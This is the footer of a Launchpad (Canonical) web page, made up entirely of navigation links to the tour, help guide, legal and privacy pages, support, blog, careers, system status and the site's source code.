[Take the tour](https://launchpad.net/%2Btour)
 •
[Read the guide](https://help.launchpad.net/)

© 2004
[Canonical Ltd.](http://canonical.com/)
 •
[Terms of use](https://launchpad.net/legal)
 •
[Data privacy](https://www.ubuntu.com/legal/dataprivacy)
 •
[Contact Launchpad Support](/feedback)
 •
[Blog](http://blog.launchpad.net/)
 •
[Careers](https://canonical.com/careers)
 •
[System status](https://ubuntu.social/%40launchpadstatus)
 •
4d55102
([Get the code!](https://dev.launchpad.net/))


